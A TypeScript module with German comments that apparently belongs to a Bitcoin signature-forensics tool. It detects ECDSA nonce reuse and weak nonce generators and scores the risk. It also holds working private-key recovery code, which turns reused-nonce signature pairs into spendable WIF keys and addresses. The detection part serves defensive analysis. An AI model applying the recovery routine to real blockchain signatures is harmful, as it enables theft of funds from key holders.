/**
 * Module H — Nonce-Analyse
 *
 * Erkennung von Nonce-Reuse Mustern in ECDSA-Signaturen.
 * Inklusive vollständiger mathematischer Private-Key-Recovery per PDF-Herleitung.
 *
 * Mathematik (secp256k1, ECDSA Nonce-Reuse):
 *   k  = (z1 − z2) · (s1 − s2)^(-1)  mod n
 *   d  = (s1·k − z1) · r^(-1)         mod n
 */

import type { NonceAnalysisResult, NonceReuseGroup, ECDSASignature } from "./types";
import { SECP256K1, mod, modInverse, getOppositeS, encodeWIF, publicKeyFromPrivate, encodePublicKey, publicKeyToP2PKH } from "./ec-engine";

// ============================================================================
// Hilfsfunktionen: Private-Key-Recovery aus Nonce-Reuse
// ============================================================================

/**
 * Versucht die Private-Key-Recovery für eine Kombination von s1/s2 Werten.
 * Testet alle 4 Malleability-Varianten (±s1, ±s2).
 *
 * @param r  - gemeinsamer r-Wert (BigInt)
 * @param s1 - s-Wert der ersten Signatur (BigInt)
 * @param s2 - s-Wert der zweiten Signatur (BigInt)
 * @param z1 - Transaktions-Hash der ersten Transaktion (BigInt)
 * @param z2 - Transaktions-Hash der zweiten Transaktion (BigInt)
 * @returns dHex wenn erfolgreich, sonst null
 */
function attemptKeyRecovery(
  r: bigint,
  s1: bigint,
  s2: bigint,
  z1: bigint,
  z2: bigint
): string | null {
  const n = SECP256K1.n;

  const variants = [
    { s1v: s1,              s2v: s2              },
    { s1v: getOppositeS(s1), s2v: s2              },
    { s1v: s1,              s2v: getOppositeS(s2) },
    { s1v: getOppositeS(s1), s2v: getOppositeS(s2) },
  ];

  for (const { s1v, s2v } of variants) {
    try {
      const sDiff = mod(s1v - s2v, n);
      if (sDiff === 0n) continue;

      const zDiff = mod(z1 - z2, n);
      // k = (z1 - z2) · (s1 - s2)^(-1) mod n
      const k = mod(zDiff * modInverse(sDiff, n), n);
      if (k === 0n) continue;

      // d = (s1·k - z1) · r^(-1) mod n
      const rInv = modInverse(r, n);
      const d = mod((mod(s1v * k, n) - z1) * rInv, n);

      if (d > 0n && d < n) {
        return d.toString(16).padStart(64, "0");
      }
    } catch {
      // modInverse fehlgeschlagen (nicht invertierbar) → nächste Variante
      continue;
    }
  }

  return null;
}

// ============================================================================
// Nonce-Reuse Erkennung & Extraktion
// ============================================================================

export interface NonceMeta {
  /** Optional: echte Blockchain-TxIDs je Signatur-Index (aus On-Chain-Scan) */
  txids?: (string | undefined)[];
}

export function analyzeNonces(
  signatures: ECDSASignature[],
  zValues?: string[],
  meta?: NonceMeta
): NonceAnalysisResult {
  try {
    if (signatures.length === 0) {
      return {
        totalSignatures: 0,
        uniqueRValues: 0,
        reusedNonces: [],
        statisticalFindings: [],
        riskScore: 0,
        riskLevel: "LOW",
      };
    }

    // Parse z-Werte (SIGHASH) wenn vorhanden
    const parsedZ: (bigint | null)[] = (zValues || []).map((z) => {
      try {
        const clean = z.replace(/\s+/g, "").toLowerCase();
        if (/^[0-9a-f]{1,64}$/.test(clean)) {
          return BigInt("0x" + clean);
        }
        return null;
      } catch {
        return null;
      }
    });

    // Gruppiere nach r-Wert (gleicher r = gleicher Nonce k)
    const rGroups = new Map<string, number[]>();

    signatures.forEach((sig, idx) => {
      const rHex = sig.r.toString(16).padStart(64, "0");
      const indices = rGroups.get(rHex) || [];
      indices.push(idx);
      rGroups.set(rHex, indices);
    });

    const uniqueRValues = rGroups.size;
    const reusedNonces: NonceReuseGroup[] = [];

    for (const [rValue, indices] of rGroups) {
      if (indices.length > 1) {
        const sig1 = signatures[indices[0]];
        const sig2 = signatures[indices[1]];

        const s1Hex = sig1.s.toString(16).padStart(64, "0");
        const s2Hex = sig2.s.toString(16).padStart(64, "0");

        // Nur echte TxIDs — keine Pseudo-Hashes aus s-Werten mehr
        const txHash1 = meta?.txids?.[indices[0]] || undefined;
        const txHash2 = meta?.txids?.[indices[1]] || undefined;

        // Versuche Key-Recovery wenn z-Werte für beide Indizes vorhanden
        let extractedPrivateKey: string | undefined;
        let derivedAddress: string | undefined;
        let derivedPublicKey: string | undefined;
        let wifCompressed: string | undefined;
        let wifUncompressed: string | undefined;
        let recoveryNote: string | undefined;

        const z1 = parsedZ[indices[0]] ?? null;
        const z2 = parsedZ[indices[1]] ?? null;

        if (z1 !== null && z2 !== null) {
          try {
            const r = sig1.r; // r ist für beide identisch
            const dHex = attemptKeyRecovery(r, sig1.s, sig2.s, z1, z2);

            if (dHex) {
              extractedPrivateKey = dHex;
              wifCompressed = encodeWIF(dHex, true);
              wifUncompressed = encodeWIF(dHex, false);

              // Public Key und Adresse ableiten
              const d = BigInt("0x" + dHex);
              const pubPoint = publicKeyFromPrivate(d);
              derivedPublicKey = encodePublicKey(pubPoint, true);
              derivedAddress = publicKeyToP2PKH(derivedPublicKey);

              recoveryNote = `✅ PRIVATE KEY ERFOLGREICH EXTRAHIERT: d = ${dHex.slice(0, 16)}... Adresse: ${derivedAddress}`;
            } else {
              recoveryNote = `⚠️ Key-Recovery gescheitert: z-Werte passen nicht zu r-Wert. Alle 4 Malleability-Varianten getestet.`;
            }
          } catch (e: unknown) {
            recoveryNote = `⚠️ Key-Recovery Fehler: ${e instanceof Error ? e.message : String(e)}`;
          }
        }

        reusedNonces.push({
          rValue: rValue.slice(0, 16) + "..." + rValue.slice(-8),
          rValueFull: rValue,
          count: indices.length,
          signatureIndices: indices,
          s1: s1Hex,
          s2: s2Hex,
          txHash1,
          txHash2,
          mockedTxHash1: txHash1,
          mockedTxHash2: txHash2,
          extractedPrivateKey,
          derivedAddress,
          derivedPublicKey,
          wifCompressed,
          wifUncompressed,
          forensicNote:
            recoveryNote ||
            `⚠️ FORENSISCHER HINWEIS: ${indices.length} Signaturen teilen sich den gleichen r-Wert. ` +
            `Dies deutet auf Nonce-Wiederverwendung hin. Für vollständige Key-Recovery echte z-Werte ` +
            `(SIGHASH pro Input) oder TxIDs mit On-Chain-Scan nutzen.`,
        });
      }
    }

    // Statistische Analyse der r-Verteilung
    const statisticalFindings: string[] = [];

    if (reusedNonces.length === 0 && signatures.length > 1) {
      statisticalFindings.push(
        `Alle ${signatures.length} Signaturen haben einzigartige r-Werte. Keine Nonce-Wiederverwendung detektiert.`
      );
    }

    const rBitLengths = signatures.map((sig) => sig.r.toString(2).length);
    const avgBitLength = rBitLengths.reduce((a, b) => a + b, 0) / rBitLengths.length;
    const minBitLength = Math.min(...rBitLengths);

    if (avgBitLength < 240) {
      statisticalFindings.push(
        `Durchschnittliche r-Bit-Länge: ${avgBitLength.toFixed(1)} (erwartet: ~256). Möglicherweise schwacher PRNG.`
      );
    }

    if (minBitLength < 200) {
      statisticalFindings.push(
        `Minimale r-Bit-Länge: ${minBitLength}. Verdächtig niedrig — könnte auf deterministischen oder schwachen Nonce-Generator hindeuten.`
      );
    }

    if (signatures.length >= 3) {
      const rValues = signatures.map((s) => s.r);
      let sequentialCount = 0;
      for (let i = 1; i < rValues.length; i++) {
        const diff =
          rValues[i] > rValues[i - 1]
            ? rValues[i] - rValues[i - 1]
            : rValues[i - 1] - rValues[i];
        if (diff < 1000n) {
          sequentialCount++;
        }
      }
      if (sequentialCount >= 2) {
        statisticalFindings.push(
          `${sequentialCount} aufeinanderfolgende Signatur-Paare mit nahem r-Wert entdeckt. ` +
            `Deutet auf sequentiellen/inkrementellen Nonce-Generator hin.`
        );
      }
    }

    // Risikobewertung
    let riskScore = 0;
    const hasKeyRecovery = reusedNonces.some((g) => g.extractedPrivateKey);
    if (hasKeyRecovery) {
      riskScore = 100; // Key vollständig kompromittiert
    } else if (reusedNonces.length > 0) {
      riskScore = 95; // Nonce-Reuse detektiert, z-Werte fehlen
    } else if (minBitLength < 200) {
      riskScore = 60;
    } else if (avgBitLength < 240) {
      riskScore = 35;
    } else {
      riskScore = 5;
    }

    let riskLevel: NonceAnalysisResult["riskLevel"] = "LOW";
    if (riskScore >= 80) riskLevel = "CRITICAL";
    else if (riskScore >= 50) riskLevel = "HIGH";
    else if (riskScore >= 25) riskLevel = "MEDIUM";

    return {
      totalSignatures: signatures.length,
      uniqueRValues,
      reusedNonces,
      statisticalFindings,
      riskScore,
      riskLevel,
    };
  } catch (error: unknown) {
    return {
      totalSignatures: signatures.length,
      uniqueRValues: 0,
      reusedNonces: [],
      statisticalFindings: [
        `FATAL APP ERROR in analyzeNonces: ${error instanceof Error ? error.message : String(error)}`,
      ],
      riskScore: 0,
      riskLevel: "LOW",
    };
  }
}
